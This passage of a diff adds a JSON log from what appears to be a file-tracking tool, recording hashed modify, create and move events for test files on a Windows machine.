+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "3b0176ad59690fc8dead97a7f428850bbebc7d8c4a7542e64b479a53e6fda1c3",
+      "content_hash": "a00819974aa54446e8d5d2c367cf6bdb69dc75a12285346141d01e83e9772762",
+      "filesystem_hash": "66c7cc2e5fde90fdcf730fce71a7ba88ca5dd123ad0ef921039140cb36ade21f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12379,
+        "created": 1765783717.286699,
+        "modified": 1765960105.175008,
+        "accessed": 1765960105.1871417,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765962800,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "b08132fd9679883c50b07c195a3f2241dc1251e89522c5de01f43a855b614314",
+      "content_hash": "3c801134c76b53168eeaa6a550ac0392a64bc54421a73fb96422a6403b107838",
+      "filesystem_hash": "012907ac9e0b0b67215db1222e5bd76a42885a1f86615d67072bd7d33938935c",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12387,
+        "created": 1765783717.286699,
+        "modified": 1765962800.9319513,
+        "accessed": 1765962800.9567623,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765967904,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "39734ba14ea8664667d9e432c38811d0c666a4682e6843b85dc26bd441b22508",
+      "content_hash": "e0113c98f789700b68650ec1d6755ff1794f8f899d11e810d2c2b9503405fa04",
+      "filesystem_hash": "8f40a8da66c2f140d68e621229f437ead93d8228cec80e5d902eed06697ffdbf",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12395,
+        "created": 1765783717.286699,
+        "modified": 1765967904.8665423,
+        "accessed": 1765967904.8801305,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765967911,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "26e0776b797f35ad8d83b020a7464ff1305c830f2934ad83c0494859fe4ee2db",
+      "content_hash": "a85d2f819b946385d6681ad15e99bccb02c0e431bc6da7b1200af62e5c08ca00",
+      "filesystem_hash": "0cc19d41ff71597cce94c5fe422f234841740490cd73ff2d8201671759a13982",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12401,
+        "created": 1765783717.286699,
+        "modified": 1765967911.216994,
+        "accessed": 1765967911.2280037,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765978595,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "92a1b7c0471001da8ae9245b2053fc51a20bccc81f527580aeaab9dd96ed59c1",
+      "content_hash": "39c74b982dd7b5f5d2947672e67040321426c6a74762f72950d56059ce26da1c",
+      "filesystem_hash": "82f9d5fed6925a4f9bf51dd47cc7323a603534c88db0f3d1394758afe808b900",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12402,
+        "created": 1765783717.286699,
+        "modified": 1765978595.074691,
+        "accessed": 1765978595.0852082,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766037831,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "657ced05ffefff9598214ec4bae348d0b326644a6a1f5f3db4179f4e2b185919",
+      "content_hash": "ebfff441dc7004e69a70e02cb7f3d56f6b1a4e27adfd26fe4b913d9a5b919cc2",
+      "filesystem_hash": "96e1b797b3efa02b476534aa99cebed628f43af2035a86cb3f6b230afc698127",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12403,
+        "created": 1765783717.286699,
+        "modified": 1766037831.837715,
+        "accessed": 1766037831.8668363,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766044660,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "081a058ba8675b1b8f1629e2e8ba3072439ad716833bc02bbe9f0e00c0ba37c6",
+      "content_hash": "49cbc13eec9b799c6a9dac6d606cd112194e965988199b401bf0a8893da8eb2b",
+      "filesystem_hash": "793afd7acad6283cfb37f3474f44753574a03486a4e4ff96ba8106cba95869a5",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12411,
+        "created": 1765783717.286699,
+        "modified": 1766044660.5974736,
+        "accessed": 1766044660.6243281,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766044666,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "69f2b85b7057ab6ec6fd850f87e38f22cc388cefa8f9fd48679e0df34c8d4332",
+      "content_hash": "965e1e43a406c393bc0742f48ec8c9c4f0a389c3b0f0cfaddaf10c7ed074f956",
+      "filesystem_hash": "4621c9faa257be45de0bcd1c89d469fffcade565211600699ca5d989694c2d1e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12426,
+        "created": 1765783717.286699,
+        "modified": 1766044666.8707879,
+        "accessed": 1766044666.8858414,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766048497,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "7fc34c6cf5de3681f85056c6f4448af2c27c01fbb6c1ff8d4c99cbee662611ec",
+      "content_hash": "0f65dcf1d5b97624af47e1df5dd55eaa4b270cad1c85cdd36b3e7ef01f804d65",
+      "filesystem_hash": "80c0a914b6a83e6736955930abe219993da480cf5408ee4284301adc1c66b286",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12431,
+        "created": 1765783717.286699,
+        "modified": 1766048497.6894703,
+        "accessed": 1766048497.7204964,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766048541,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "cfb4429804409e5b0e67b3d135755554ee1aa766fda9a26897918a4b03f0d361",
+      "content_hash": "f649eb9ef3b14f0a8b71f4b7ddcf8ee39640fb2c7a5992f7e3193ee92a07f474",
+      "filesystem_hash": "d4747d3d40dbfe349492fdf097e4708d9d07ad34ee600699e25b1fd58c9239a3",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12439,
+        "created": 1765783717.286699,
+        "modified": 1766048541.2072206,
+        "accessed": 1766048541.2197888,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766048615,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "7ed66003b1756da9cc5dc038697e9f3bf1acf8b342142eb13bc6493f8e2b8391",
+      "content_hash": "7b3a6ea6bf8198c0742b7677869a5b098e06ca5ed92d85daf02a600a4fea48b4",
+      "filesystem_hash": "957f0d567410c99e2d668af5a466367539471ce9752cec16e2823840f75b3f19",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12445,
+        "created": 1765783717.286699,
+        "modified": 1766048615.110228,
+        "accessed": 1766048615.1218505,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766054370,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "6723c5a3039dd9ab4631cca4e1320ad06daf25847c5de6a047ade7c954e8ded8",
+      "content_hash": "9b1954e68e2fff64a36976c4e412773993c5bb6639d9a86012d204a1dd997ec2",
+      "filesystem_hash": "e6f151f67570aa6f2f87866220cc688ee653f17a53e04014a1519f3d82dacec2",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12472,
+        "created": 1765783717.286699,
+        "modified": 1766054370.154037,
+        "accessed": 1766054370.1658094,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document.docx": [
+    {
+      "timestamp": 1765878432,
+      "event": "CREATED",
+      "file_uid": "5fa348a6-52be-4114-b542-8c03f2e0ae70",
+      "combined_hash": "16fa0769d1f85fc370f92c288bfee3ef15cabf7e00ca5b14b716f079076d247c",
+      "content_hash": "4ab34135b2dff653397f9faa27687c8201f8ffde2dfb92cd7aca8e4dc17f975d",
+      "filesystem_hash": "f1c7dd52a37f0ed89c7dcb872be6cfe7a5cbdb3a367be189c4db84743ff0e950",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 1105543,
+        "created": 1765878428.4924254,
+        "modified": 1764920726.4179456,
+        "accessed": 1765878432.3854456,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765879200,
+      "event": "MOVED",
+      "old_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document 2.docx",
+      "new_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document.docx",
+      "file_uid": "5fa348a6-52be-4114-b542-8c03f2e0ae70",
+      "combined_hash": "16fa0769d1f85fc370f92c288bfee3ef15cabf7e00ca5b14b716f079076d247c",
+      "content_hash": "4ab34135b2dff653397f9faa27687c8201f8ffde2dfb92cd7aca8e4dc17f975d",
+      "filesystem_hash": "7c4255b6772a0b94505162f87aedb950c5a4a0838e1e915d5ac142ea3c211eca",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 1105543,
+        "created": 1765878428.4924254,
+        "modified": 1764920726.4179456,
+        "accessed": 1765879200.0583487,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document 2.docx": [
+    {
+      "timestamp": 1765879179,
+      "event": "MOVED",
+      "old_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document.docx",
+      "new_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\Example word document 2.docx",
+      "file_uid": "5fa348a6-52be-4114-b542-8c03f2e0ae70",
+      "combined_hash": "16fa0769d1f85fc370f92c288bfee3ef15cabf7e00ca5b14b716f079076d247c",
+      "content_hash": "4ab34135b2dff653397f9faa27687c8201f8ffde2dfb92cd7aca8e4dc17f975d",
+      "filesystem_hash": "4d47d51e2544fb5088fd3b415f54c173c4f85b839bc1ae039f4989a7a8e56668",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 1105543,
+        "created": 1765878428.4924254,
+        "modified": 1764920726.4179456,
+        "accessed": 1765879179.0516503,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ]
+}
